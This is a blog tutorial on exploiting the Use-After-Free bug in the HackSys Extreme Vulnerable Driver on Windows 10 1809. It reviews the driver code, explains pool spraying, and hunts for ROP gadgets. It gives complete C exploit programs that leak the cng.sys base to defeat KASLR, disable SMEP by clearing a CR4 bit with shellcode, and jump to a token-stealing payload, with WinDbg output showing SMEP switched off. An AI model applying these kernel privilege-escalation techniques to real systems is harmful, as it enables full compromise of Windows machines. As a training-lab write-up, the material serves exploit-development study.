# https://yoshlsec.github.io/winint-compilation/winint-useafterfree/

[WinInt Compilation](https://yoshlsec.github.io/winint-compilation/)

Use-After-Free - HEVD (+ SMEP/KASLR/KPP Bypass)

# Use-After-Free - HEVD (+ SMEP/KASLR/KPP Bypass)

![](https://yoshlsec.github.io/winint-compilation/winint-useafterfree/image-8.png)

## Introduction [Permalink for this section](https://yoshlsec.github.io/winint-compilation/winint-useafterfree/\#introduction)

In this post we are going to deep in the attack: Use-After-Free (UAF) in a common windos vulnerable driver (HEVD). We will cover up some useful techniques of code review, debuggin and bypassing some used protections like Supervisor Mode Execution Prevention ( **SMEP**), Kernel Patch Protection ( **KPP**) also know as _PatchGuard_, Kernel Address Space Layout Randomization ( **KASLR**) and others concepts like **Stack Canary** or GS Cookie. We will try to analyze each protective measure in detail without making it tedious.

### Environment [Permalink for this section](https://yoshlsec.github.io/winint-compilation/winint-useafterfree/\#environment)

To make this explotation we will have two virtual machines; the victim, which contains the HEVD, is a Windows 1809 with an OS Build of 17763.1075, is useful to know the exact version to be able to calculate correctly structure offsets in vergilius and, in this case, know that the _SMAP_ is disabled by default.

- [https://www.vergiliusproject.com/kernels/x64/windows-10/1809/](https://www.vergiliusproject.com/kernels/x64/windows-10/1809/)

On the other hand, we are going to have a WinDBG connected to the victim machine to debug and analyze all the payloads. The setup of these two machines will not be explained here, as there are many resources available online, including on this website.

## Source Analysis [Permalink for this section](https://yoshlsec.github.io/winint-compilation/winint-useafterfree/\#source-analysis)

As in other many walkthroughts, the code review will be with the source code from github:

[https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/tree/master/Driver/HEVD/Windows](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/tree/master/Driver/HEVD/Windows)

But you can also choose to open your trusted decompiler and reverse-engineer the driver, in this case, we will be focusing in the following 4 functions:

```c
#define HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL   IOCTL(0x804)
#define HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL        IOCTL(0x805)
#define HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL       IOCTL(0x806)
#define HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL  IOCTL(0x807)
```

Being `IOCTL`: `CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)`

### Struct review [Permalink for this section](https://yoshlsec.github.io/winint-compilation/winint-useafterfree/\#struct-review)

Each functions, as the name suggests allocates, execute and frees an object, and allocates a fake object, but… what object? If we go to [`UseAfterFreeNonPagedPool.h`](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/HEVD/Windows/UseAfterFreeNonPagedPool.h#L63), the driver contains the structure:

```c
typedef struct _USE_AFTER_FREE_NON_PAGED_POOL
{
    FunctionPointer Callback;
    CHAR Buffer[0x54];
} USE_AFTER_FREE_NON_PAGED_POOL, *PUSE_AFTER_FREE_NON_PAGED_POOL;
```

Also, [6 lines further](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/HEVD/Windows/UseAfterFreeNonPagedPool.h#L69) we can see the _Fake Object_ used in the **IOCTL 0x807**

```c
typedef struct _FAKE_OBJECT_NON_PAGED_POOL
{
    CHAR Buffer[0x54 + sizeof(PVOID)];
} FAKE_OBJECT_NON_PAGED_POOL, *PFAKE_OBJECT_NON_PAGED_POOL;
```

Anyways, I want to comment that in the following explotation, we are going to redefine `_FAKE_OBJECT_NON_PAGED_POOL` to a real object:

```c
typedef struct _FAKE_OBJECT_NON_PAGED_POOL
{
    FunctionPointer Callback;
    CHAR Buffer[0x54];
} FAKE_OBJECT_NON_PAGED_POOL, *PFAKE_OBJECT_NON_PAGED_POOL;
```

### Functions review [Permalink for this section](https://yoshlsec.github.io/winint-compilation/winint-useafterfree/\#functions-review)

Inside [UseAfterFreeNonPagedPool.c](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/HEVD/Windows/UseAfterFreeNonPagedPool.c), we can take a closer look at how it works, specifically how it allocate the object and execute it.

Note

In my opinion, the driver code seems a bit confusing, so I’m going to rewrite it to make it easier to read. So all SEH (Structured Exception Handling) will be removed, but they are there to avoid BSODs.

#### AllocateUaF Function [Permalink for this section](https://yoshlsec.github.io/winint-compilation/winint-useafterfree/\#allocateuaf-function)

In short, the function reserves a pool with a buffer filled with A’s ( [`RtlFillMemory`](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlfillmemory)), and the callback receives the memory address of the buffer.

Then we store this newly allocated object in a global variable named: `g_UseAfterFreeObjectNonPagedPool`

```c
NTSTATUS AllocateUaFObjectNonPagedPool(VOID)
{
    NTSTATUS Status = STATUS_SUCCESS;
    PUSE_AFTER_FREE_NON_PAGED_POOL UseAfterFree = NULL;

    PAGED_CODE();
    DbgPrint("[+] Allocating UaF Object\n");
    UseAfterFree = (PUSE_AFTER_FREE_NON_PAGED_POOL)ExAllocatePoolWithTag(
        NonPagedPool,
        sizeof(USE_AFTER_FREE_NON_PAGED_POOL),
        (ULONG)POOL_TAG
    );

    if (!UseAfterFree)
    {
        DbgPrint("[-] Unable to allocate Pool chunk\n");

        Status = STATUS_NO_MEMORY;
        return Status;
    }
    else
    {
        DbgPrint("[+] Pool Tag: %s\n", STRINGIFY(POOL_TAG));
        DbgPrint("[+] Pool Type: %s\n", STRINGIFY(NonPagedPool));
        DbgPrint("[+] Pool Size: 0x%zX\n", sizeof(USE_AFTER_FREE_NON_PAGED_POOL));
        DbgPrint("[+] Pool Chunk: 0x%p\n", UseAfterFree);
    }

    RtlFillMemory((PVOID)UseAfterFree->Buffer, sizeof(UseAfterFree->Buffer), 0x41);
    UseAfterFree->Buffer[sizeof(UseAfterFree->Buffer) - 1] = '\0';
    UseAfterFree->Callback = &UaFObjectCallbackNonPagedPool;
    g_UseAfterFreeObjectNonPagedPool = UseAfterFree;

    DbgPrint("[+] UseAfterFree Object: 0x%p\n", UseAfterFree);
    DbgPrint("[+] g_UseAfterFreeObjectNonPagedPool: 0x%p\n", g_UseAfterFreeObjectNonPagedPool);
    DbgPrint("[+] UseAfterFree->Callback: 0x%p\n", UseAfterFree->Callback);

    return Status;
}
```

So, if the callback stores the function address of the buffer, it will be called, no?

#### UseUaF Function [Permalink for this section](https://yoshlsec.github.io/winint-compilation/winint-useafterfree/\#useuaf-function)

And that is whay does [`UseUaFObjectNonPagedPool`](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/HEVD/Windows/UseAfterFreeNonPagedPool.c#L173), executed what is on `g_UseAfterFreeObjectNonPagedPool->Callback()`, if it exists.

```c
NTSTATUS UseUaFObjectNonPagedPool(VOID)
{
    NTSTATUS Status = STATUS_UNSUCCESSFUL;

    PAGED_CODE();
    if (g_UseAfterFreeObjectNonPagedPool)
    {
        DbgPrint("[+] Using UaF Object\n");
        DbgPrint("[+] g_UseAfterFreeObjectNonPagedPool: 0x%p\n", g_UseAfterFreeObjectNonPagedPool);
        DbgPrint("[+] g_UseAfterFreeObjectNonPagedPool->Callback: 0x%p\n", g_UseAfterFreeObjectNonPagedPool->Callback);
        DbgPrint("[+] Calling Callback\n");

        if (g_UseAfterFreeObjectNonPagedPool->Callback)
            g_UseAfterFreeObjectNonPagedPool->Callback();

        Status = STATUS_SUCCESS;
    }

    return Status;
}
```

This will be displayed in the assembly as a conditional jump: `jne` followed with an `call rcx`, but that’s a problem for your future self.

After seeing this both functions, you will be asking, but why is this vulnerable to UAF, it only executes a buffer in a secure structure and you are right, the vulnerability shows in the [`FreeUaFObjectNonPagedPool`](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/HEVD/Windows/UseAfterFreeNonPagedPool.c#L213) function.

#### FreeUaF Function [Permalink for this section](https://yoshlsec.github.io/winint-compilation/winint-useafterfree/\#freeuaf-function)

Here is where the problem begins, when the object is freed the `g_UseAfterFreeObjectNonPagedPool` still holds the reference to a dangling pointer, that you can abuse to overwrite whatever you want and execute directly a shellcode (but luckily we have SMEP activated so we can’t execute directly a shellcode)

```c
NTSTATUS FreeUaFObjectNonPagedPool(VOID)
{
    NTSTATUS Status = STATUS_UNSUCCESSFUL;
    PAGED_CODE();

    if (g_UseAfterFreeObjectNonPagedPool)
    {
        DbgPrint("[+] Freeing UaF Object\n");
        DbgPrint("[+] Pool Tag: %s\n", STRINGIFY(POOL_TAG));
        DbgPrint("[+] Pool Chunk: 0x%p\n", g_UseAfterFreeObjectNonPagedPool);
        ExFreePoolWithTag((PVOID)g_UseAfterFreeObjectNonPagedPool, (ULONG)POOL_TAG);
        Status = STATUS_SUCCESS;
    }

    return Status;
}
```

##### SMEP (brief explanation) [Permalink for this section](https://yoshlsec.github.io/winint-compilation/winint-useafterfree/\#smep-brief-explanation)

SMEP also know as Supervisor Mode Execution Preventions, is the protection encharged to avoid the kernel to execute code in user-mode space. To see if it is active you can check the 20th bit of the Control Register 4 ( **cr4**), it is enable if the bit is up, in other words, their value is non-zero.

For more detailed explication of the protection please check j00ru’s blog:
[https://j00ru.vexillium.org/2011/06/smep-what-is-it-and-how-to-beat-it-on-windows/](https://j00ru.vexillium.org/2011/06/smep-what-is-it-and-how-to-beat-it-on-windows/)

#### AllocateFake Function [Permalink for this section](https://yoshlsec.github.io/winint-compilation/winint-useafterfree/\#allocatefake-function)

No detailed explanation, allocates fake object.

```c
NTSTATUS AllocateFakeObjectNonPagedPool(_In_ PFAKE_OBJECT_NON_PAGED_POOL UserFakeObject)
{
    NTSTATUS Status = STATUS_SUCCESS;
    PFAKE_OBJECT_NON_PAGED_POOL KernelFakeObject = NULL;
    PAGED_CODE();

    DbgPrint("[+] Creating Fake Object\n");
    KernelFakeObject = (PFAKE_OBJECT_NON_PAGED_POOL)ExAllocatePoolWithTag(
        NonPagedPool,
        sizeof(FAKE_OBJECT_NON_PAGED_POOL),
        (ULONG)POOL_TAG
    );

    if (!KernelFakeObject)
    {
        DbgPrint("[-] Unable to allocate Pool chunk\n");
        Status = STATUS_NO_MEMORY;
        return Status;
    }
    else
    {
        DbgPrint("[+] Pool Tag: %s\n", STRINGIFY(POOL_TAG));
        DbgPrint("[+] Pool Type: %s\n", STRINGIFY(NonPagedPool));
        DbgPrint("[+] Pool Size: 0x%zX\n", sizeof(FAKE_OBJECT_NON_PAGED_POOL));
        DbgPrint("[+] Pool Chunk: 0x%p\n", KernelFakeObject);
    }

    ProbeForRead(
        (PVOID)UserFakeObject,
        sizeof(FAKE_OBJECT_NON_PAGED_POOL),
        (ULONG)__alignof(UCHAR)
    );

    RtlCopyMemory(
        (PVOID)KernelFakeObject,
        (PVOID)UserFakeObject,
        sizeof(FAKE_OBJECT_NON_PAGED_POOL)
    );

    KernelFakeObject->Buffer[sizeof(KernelFakeObject->Buffer) - 1] = '\0';
    DbgPrint("[+] Fake Object: 0x%p\n", KernelFakeObject);
    return Status;
}
```

## Initial Analysis [Permalink for this section](https://yoshlsec.github.io/winint-compilation/winint-useafterfree/\#initial-analysis)

I was surprise when taking resources for this blogs the amount of exhaustive walkthoughts doing Heap Grooming or techniques like: [Heap Fengshui](https://www.alex-ionescu.com/kernel-heap-spraying-like-its-2015-swimming-in-the-big-kids-pool/). For the exploit of this UAF is not necesary, but useful for other complex attacks, despite talking about this technique is a very soft way to understand how the kernel heap, also known as kernel pools, works in.

### How ExAllocatePool works [Permalink for this section](https://yoshlsec.github.io/winint-compilation/winint-useafterfree/\#how-exallocatepool-works)

This function routine allocates pool memory of the specified type and returns a pointer to the allocated block, in other words is like the `malloc` you are used while writing user-mode scripts.

Each pool has its own tag, usually this tag shows up where the pool come from, what is used for, or any identification, anyways you can see more in the microsoft wiki.

[https://techcommunity.microsoft.com/blog/askperf/an-introduction-to-pool-tags/372983](https://techcommunity.microsoft.com/blog/askperf/an-introduction-to-pool-tags/372983)

In UAF HEVD exploitation, we pay close attention to the Non-Paged Pool. When the driver frees an object but keeps a “dangling pointer” to it, we need to “occupy” that exact memory address before the driver uses it again.

Thats why **Named Pipes** are used in this kernel vulnerabilites. Functions like ExAllocatePoolWithTag take a NumberOfBytes argument. By using Pipes, an attacker can trigger allocations of an arbitrary size. If we spray the pool with objects that match the size of the freed HEVD object, the Pool Manager is highly likely to place our controlled data in the recently vacated slot. This technique is known as Pool Reclaiming, and it allows us to hijack the execution flow when the driver eventually follows that dangling pointer.

If you have payed attention, its exactly the same functionality as an Use-After-Free in user-mode. To conclude, we need to know that the kernel adds a **Pool Header** (usually 0x10 bytes of length in x64), so if an object size if 0x50, you will allocate 0x60 bytes.

### PoolMoonX [Permalink for this section](https://yoshlsec.github.io/winint-compilation/winint-useafterfree/\#poolmoonx)

With the tool: [PoolMoonX](https://github.com/zodiacon/PoolMonX) of Pavel Yosifovich, we are able to list all the pools of the operative system. If we monitor the pool tag: Non-Paged, NpFr, we can see the number of Allocs and the size in Bytes.

![](https://yoshlsec.github.io/winint-compilation/winint-useafterfree/image.png)

We can also create 10 pipes to see if the number of allocations changes:

![](https://yoshlsec.github.io/winint-compilation/winint-useafterfree/Pasted%20image%2020260331113105.png)

In this case, only 100 of new allocations occurs, but you can increment the iterations in a for-loop to allocate more and more pools to collapse the kernel.

## Flow Hijacking [Permalink for this section](https://yoshlsec.github.io/winint-compilation/winint-useafterfree/\#flow-hijacking)

Once we know the theory we are able to hijack the value of the callback, to debug and see its changes you can use DebugView Tool, for being able to watch `DbgPrint` messages from the vulnerable driver.

![](https://yoshlsec.github.io/winint-compilation/winint-useafterfree/image-1.png)

```c
#include "UAFHEVD.h"
#include <windows.h>
#include <Psapi.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
    DWORD bytesReturned = 0;
    HANDLE hFile = CreateFile(
        L"\\\\.\\HackSysExtremeVulnerableDriver",
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
    );
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Driver not found: %d\n", GetLastError());
        return 1;
    }
    printf("[+] Driver handle: 0x%p\n", hFile);

    // Allocate the UAF object
    printf("[*] Allocating UAF Object...\n");
    DeviceIoControl(hFile, HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL,
        NULL, 0, NULL, 0, &bytesReturned, NULL);
    printf("[+] UAF Object allocated\n");

    // Free
    printf("[*] Freeing UAF Object...\n");
    DeviceIoControl(hFile, HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL,
        NULL, 0, NULL, 0, &bytesReturned, NULL);
    printf("[+] Dangling pointer live\n");

    PFAKE_OBJECT_NON_PAGED_POOL fakeObj = (PFAKE_OBJECT_NON_PAGED_POOL)malloc(sizeof(FAKE_OBJECT_NON_PAGED_POOL));
    fakeObj->Callback = 0xDEADBEEFDEADBEEF;
    RtlFillMemory(fakeObj->Buffer, sizeof(fakeObj->Buffer),0x59); // Fill with Y

    printf("[*] Spraying %d fake objects...\n", 5000);
    for (int i = 0; i < 5000; i++) {

        if (!DeviceIoControl(
            hFile,
            HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL,
            fakeObj, sizeof(FAKE_OBJECT_NON_PAGED_POOL),
            NULL, 0, &bytesReturned, NULL))
        {
            printf("[-] AllocateFakeObject[%d] failed: %d\n", i, GetLastError());
            CloseHandle(hFile);
            return 1;
        }
    }
    printf("[+] Spray done\n");

    // Trigger
    printf("[*] Triggering UAF...\n");
    DeviceIoControl(hFile, HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL,
        NULL, 0, NULL, 0, &bytesReturned, NULL);

    CloseHandle(hFile);
    return 0;
}
```

Also you can see the flow hijacking from Windbg, if you pay attention in the rcx value you will see the content: `0xdeadbeefdeadbeef`:

Note

The breakpoint was set in HEVD!UseUaFObjectNonPagedPool+0x82; Exactly in the `jne` address.

![](https://yoshlsec.github.io/winint-compilation/winint-useafterfree/image-3.png)

Furthermore, we can see the relation between the register rax and rcx., being rax a pointer to the allocated object:

```c
3: kd> dq rax
ffffc18f`ce7a52d0  deadbeef`deadbeef 59595959`59595959
ffffc18f`ce7a52e0  59595959`59595959 59595959`59595959
ffffc18f`ce7a52f0  59595959`59595959 59595959`59595959
ffffc18f`ce7a5300  59595959`59595959 59595959`59595959
ffffc18f`ce7a5310  59595959`59595959 59595959`59595959
ffffc18f`ce7a5320  00595959`59595959 00000000`00414141
ffffc18f`ce7a5330  6b636148`02070000 00000000`00000000
ffffc18f`ce7a5340  deadbeef`deadbeef 59595959`59595959
```

At the moment, people usually inserts the payload address of usermode in RCX, so the program jumps to the shellcode and execute it. The problems comes with SMEP, as we said earlier you can’t execute code in userland throught kerne, thus we can obtain a gadget to execute the whatever is in: `ffffc18fce7a52d8` being: `[rax+0x10]` or `rcx + 0x10`.

Doing this, all the code will be executed in the pool with RWX permissions.

### Finding gadget [Permalink for this section](https://yoshlsec.github.io/winint-compilation/winint-useafterfree/\#finding-gadget)

As we metioned before, we need to search to any assembly code in the kernel or drivers from Windows that adds 0x10 bytes to the rax register and later execute it.

#### Register schema [Permalink for this section](https://yoshlsec.github.io/winint-compilation/winint-useafterfree/\#register-schema)

After continuing I want to show you how registers works a little to dont be confuse if you ever seen a `ch` or `dl` register:

![](https://yoshlsec.github.io/winint-compilation/winint-useafterfree/image-4.png)

Additionally, here a table with all 16 registers

| **Registro (64-bit)** | **32-bit (low)** | **16-bit (low)** | **8-bit High** | **8-bit Low** |
| --- | --- | --- | --- | --- |
| **RAX** (Accumulator) | `EAX` | `AX` | `AH` | `AL` |
| **RBX** (Base) | `EBX` | `BX` | `BH` | `BL` |
| **RCX** (Counter) | `ECX` | `CX` | `CH` | `CL` |
| **RDX** (Data) | `EDX` | `DX` | `DH` | `DL` |
| **RSI** | `ESI` | `SI` | `SIL` | Source Index |
| **RDI** | `EDI` | `DI` | `DIL` | Destination Index |
| **RBP** | `EBP` | `BP` | `BPL` | Base Pointer |
| **RSP** | `ESP` | `SP` | `SPL` | Stack Pointer |
| **R8** | `R8D` | `R8W` | `R8B` |  |
| **R9** | `R9D` | `R9W` | `R9B` |  |
| **R10** | `R10D` | `R10W` | `R10B` |  |
| **R11** | `R11D` | `R11W` | `R11B` |  |
| **R12** | `R12D` | `R12W` | `R12B` |  |
| **R13** | `R13D` | `R13W` | `R13B` |  |
| **R14** | `R14D` | `R14W` | `R14B` |  |
| **R15** | `R15D` | `R15W` | `R15B` |  |

#### ropper.py [Permalink for this section](https://yoshlsec.github.io/winint-compilation/winint-useafterfree/\#ropperpy)

With this tool, we are able to search inside any file to find the gadget that we want, having the _VRA_ of the assembly code relative to the specified file.

```bash
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> py -m ropper --file .\ntoskrnl.exe --search "add al, 0x10; call rax;"
[INFO] Load gadgets for section: .text
[LOAD] loading... 100%
[INFO] Load gadgets for section: KVASCODE
[LOAD] loading... 100%
[INFO] Load gadgets for section: RETPOL
[LOAD] loading... 100%
[INFO] Load gadgets for section: INITKDBG
[LOAD] loading... 100%
[INFO] Load gadgets for section: POOLCODE
[LOAD] loading... 100%
[INFO] Load gadgets for section: PAGELK
[LOAD] loading... 100%
[INFO] Load gadgets for section: PAGE
[LOAD] loading... 100%
[INFO] Load gadgets for section: PAGEKD
[LOAD] loading... 100%
[INFO] Load gadgets for section: PAGEVRFY
[LOAD] loading... 100%
[INFO] Load gadgets for section: PAGEHDLS
[LOAD] loading... 100%
[INFO] Load gadgets for section: PAGEBGFX
[LOAD] loading... 100%
[INFO] Load gadgets for section: INIT
[LOAD] loading... 100%
[INFO] Load gadgets for section: INITDATA
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: add al, 0x10; call rax;
```

Since I couldn’t find the gadget in the main drivers loaded on the system or in the kernel, I decided to write the following PowerShell script to find the gadget I wanted.

```powershell
$driversPath = "$env:SystemRoot\System32\drivers"
$searchPattern = "add al, 0x10; call rax;"
$outputFile = "ropper_results.txt"

"" | Out-File $outputFile

Write-Host "Starting search for  '$searchPattern' in $driversPath..." -ForegroundColor Cyan

$drivers = Get-ChildItem -Path $driversPath -Filter *.sys

foreach ($driver in $drivers) {
    Write-Host "Analyzing: $($driver.Name)..." -ForegroundColor Gray

    $result = py -m ropper --file "$($driver.FullName)" --search "$searchPattern" --nocolor 2>$null

    if ($result -match $searchPattern) {
        "--- DRIVER: $($driver.Name) ---" | Out-File $outputFile -Append
        $result | Out-File $outputFile -Append
        " `n" | Out-File $outputFile -Append
        Write-Host "[!] Gadget founded in $($driver.Name)" -ForegroundColor Green
    }
}

Write-Host "Process completed. Results saved in $outputFile" -ForegroundColor Yellow
```

After executing this code, I obtained the perfect gadget!

```
--- DRIVER: cng.sys ---

0x00000001c000c7e1: add al, 0x10; call rax;
```

To avoid any false hopes, let’s verify that the driver is active and running on the system by default. To do this, we’ll use the following command:

```bash
PS C:\Windows\system32> .\driverquery.exe  /v | findstr "cng.sys"
Module Name  Display Name           Description            Driver Type   Start Mode State      Status     Accept Stop Accept Pause Paged Pool(bytes) Code(bytes) BSS(bytes) Link Date              Path                                             Init(bytes)
============ ====================== ====================== ============= ========== ========== ========== =========== ============ ================= =========== ========== ====================== ================================================ ===========
CNG          CNG                    CNG                    Kernel        Boot       Running    OK         TRUE        FALSE        0                 561,152     0                                 C:\Windows\system32\Drivers\cng.sys              4,096
```

Once everything has been verified, we can use the gadget to redirect the program’s flow to our shellcode/payload, bypassing SMEP

### Applying gadget [Permalink for this section](https://yoshlsec.github.io/winint-compilation/winint-useafterfree/\#applying-gadget)

Now, we have the VRA address from the gadget: `0x00000001c000c7e1` but we need the offset of the gadget relative from the base address of `cng.sys`.

Using _DetectItEasy_ we can obtain the base address of the driver and obtain the real offset: `cng.sys+0xc7e1`

![](https://yoshlsec.github.io/winint-compilation/winint-useafterfree/image-5.png)

By reading it we cant identify the gadget we wanted, I think because as it is `call rax`, windbg precalculates the address and with some cache or something, it stores it incorrectly, but well, the jump to our ROP chain will run correctly.

```c
0: kd> uu cng.sys+0xc7e1
cng!BCryptHashData+0x3ef1:
fffff802`294867e1 0410            add     al,10h
fffff802`294867e3 e8f8ba0a00      call    fffff802`295322e0
fffff802`294867e8 396c2454        cmp     dword ptr [rsp+54h],ebp
fffff802`294867ec 0f8556010000    jne     cng!BCryptHashData+0x4058 (fffff802`29486948)
fffff802`294867f2 448b6c2444      mov     r13d,dword ptr [rsp+44h]
fffff802`294867f7 eb1b            jmp     cng!BCryptHashData+0x3f24 (fffff802`29486814)
fffff802`294867f9 8bc3            mov     eax,ebx
fffff802`294867fb 0fafc1          imul    eax,ecx
```

#### Bypassing KASRL [Permalink for this section](https://yoshlsec.github.io/winint-compilation/winint-useafterfree/\#bypassing-kasrl)

Using the function `getBaseAddr` from the blog: [https://vuln.dev/windows-kernel-exploitation-hevd-x64-use-after-free/](https://vuln.dev/windows-kernel-exploitation-hevd-x64-use-after-free/), we can obtain the base address of any file, in this case, the driver `cng.sys`, here a full code to obtain the leak:

```c
#include <windows.h>
#include <Psapi.h>

ULONGLONG getBaseAddr(LPCWSTR drvName) {
    LPVOID drivers[512];
    DWORD cbNeeded;
    int nDrivers, i = 0;
    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers)) {
        WCHAR szDrivers[512];
        nDrivers = cbNeeded / sizeof(drivers[0]);
        for (i = 0; i < nDrivers; i++) {
            if (GetDeviceDriverBaseName(drivers[i], szDrivers, sizeof(szDrivers) / sizeof(szDrivers[0]))) {
                if (wcscmp(szDrivers, drvName) == 0) {
                    return (ULONGLONG)drivers[i];
                }
            }
        }
    }
    return 0;
}

int main() {
    ULONGLONG cngBase = getBaseAddr(L"cng.sys");

    ULONGLONG CALL_RAX_GADGET = cngBase + 0x00c7e1;
    printf("[*] leaked cng.sys base @ 0x%016llx\n", cngBase);
    printf("[*] Gadget address @ 0x%016llx\n", CALL_RAX_GADGET);

    return 0;
}
```

### Pre-exploiting shellcode [Permalink for this section](https://yoshlsec.github.io/winint-compilation/winint-useafterfree/\#pre-exploiting-shellcode)

I’m going to provide the simplest code for executing the shellcode; at this point, most other analyses would have wrapped up the article and the exploit. But not us 😈

```c
#include "UAFHEVD.h"
#include <windows.h>
#include <Psapi.h>
#include <stdio.h>
#include <stdlib.h>

unsigned char shellcode[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x0F\x20\xE0\x48\x25\xFF\xFF\xEF\xFF\x0F\x22\xE0\xC3";

ULONGLONG getBaseAddr(LPCWSTR drvName) {
    LPVOID drivers[512];
    DWORD cbNeeded;
    int nDrivers, i = 0;
    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers)) {
        WCHAR szDrivers[512];
        nDrivers = cbNeeded / sizeof(drivers[0]);
        for (i = 0; i < nDrivers; i++) {
            if (GetDeviceDriverBaseName(drivers[i], szDrivers, sizeof(szDrivers) / sizeof(szDrivers[0]))) {
                if (wcscmp(szDrivers, drvName) == 0) {
                    return (ULONGLONG)drivers[i];
                }
            }
        }
    }
    return 0;
}

int main() {
    DWORD bytesReturned = 0;

    HANDLE hFile = CreateFile(
        L"\\\\.\\HackSysExtremeVulnerableDriver",
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
    );
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Driver not found: %d\n", GetLastError());
        return 1;
    }
    printf("[+] Driver handle: 0x%p\n", hFile);

    // Allocate the UAF object
    printf("[*] Allocating UAF Object...\n");
    DeviceIoControl(hFile, HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL,
        NULL, 0, NULL, 0, &bytesReturned, NULL);
    printf("[+] UAF Object allocated\n");

    // Free
    printf("[*] Freeing UAF Object...\n");
    DeviceIoControl(hFile, HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL,
        NULL, 0, NULL, 0, &bytesReturned, NULL);
    printf("[+] Dangling pointer live\n");

    // Build fake object:
    PFAKE_OBJECT_NON_PAGED_POOL fakeObj = (PFAKE_OBJECT_NON_PAGED_POOL)malloc(sizeof(FAKE_OBJECT_NON_PAGED_POOL));

    ULONGLONG cngBase = getBaseAddr(L"cng.sys");
    ULONGLONG CALL_RAX_GADGET = cngBase + 0x0c7e1;
    printf("[*] leaked cng.sys base @ 0x%016llx\n", cngBase);
    printf("[*] Gadget address @ 0x%016llx\n", CALL_RAX_GADGET);

    fakeObj->Callback = (PVOID)CALL_RAX_GADGET;

    ULONGLONG userFA = (ULONGLONG)TokenStealingPayloadPsReferencePrimaryToken;
    memcpy(&shellcode[13], &userFA, sizeof(ULONGLONG));

    printf("[*] Size of the shellcode: %zx\n", sizeof(shellcode));
    if (sizeof(shellcode) <= sizeof(fakeObj->Buffer))
        memcpy(fakeObj->Buffer, shellcode, sizeof(shellcode));
    else
        printf("[-] Size of shellcode bigger than the buffer space\n");

    printf("Userland payload @ 0x%016llx\n", &userFA);

    printf("[*] Spraying %d fake objects...\n", 100000);
    for (int i = 0; i < 5000; i++) {

        if (!DeviceIoControl(
            hFile,
            HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL,
            fakeObj, sizeof(FAKE_OBJECT_NON_PAGED_POOL),
            NULL, 0, &bytesReturned, NULL))
        {
            printf("[-] AllocateFakeObject[%d] failed: %d\n", i, GetLastError());
            CloseHandle(hFile);
            return 1;
        }
    }
    printf("[+] Spray done\n");

    // Trigger
    printf("[*] Triggering UAF...\n");
    DeviceIoControl(hFile, HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL,
        NULL, 0, NULL, 0, &bytesReturned, NULL);

    CloseHandle(hFile);
    return 0;
}
```

From now on, I’ll use the following website to create shellcodes and understand opcodes.

[https://defuse.ca/online-x86-assembler.htm](https://defuse.ca/online-x86-assembler.htm)

The first shellcode being:

```c
0:  90                      nop
1:  90                      nop
2:  90                      nop
3:  90                      nop
4:  90                      nop
5:  90                      nop
6:  90                      nop
7:  90                      nop
8:  0f 20 e0                mov    rax,cr4
b:  48 25 ff ff ef ff       and    rax,0xffffffffffefffff
11: 0f 22 e0                mov    cr4,rax
14: c3                      ret
```

You will be asking, why do you have 8 nops? We use that for padding, if you have been paying attention in the gadget we have `add al,0x10` and the size of a void pointer is `0x08`, so we need to ignore another `0x08` bytes to aling. Once we execute that, the SMEP will be disabled:

```c
6: kd> t
ffff8c05`a9a9a3f0 0f20e0          mov     rax,cr4
6: kd> t
ffff8c05`a9a9a3f3 4825ffffefff    and     rax,0FFFFFFFFFFEFFFFFh
6: kd> .formats cr4
Evaluate expression:
  Hex:     00000000`001506f8
  Decimal: 1378040
  Decimal (unsigned) : 1378040
  Octal:   0000000000000005203370
  Binary:  00000000 00000000 00000000 00000000 00000000 00010101 00000110 11111000
  Chars:   ........
  Time:    Fri Jan 16 23:47:20 1970
  Float:   low 1.93105e-039 high 0
  Double:  6.80842e-318
6: kd> t
ffff8c05`a9a9a3f9 0f22e0          mov     cr4,rax
6: kd> .formats cr4
Evaluate expression:
  Hex:     00000000`000506f8
  Decimal: 329464
  Decimal (unsigned) : 329464
  Octal:   0000000000000001203370
  Binary:  00000000 00000000 00000000 00000000 00000000 00000101 00000110 11111000
  Chars:   ........
  Time:    Sun Jan  4 20:31:04 1970
  Float:   low 4.61677e-040 high 0
  Double:  1.62777e-318
```

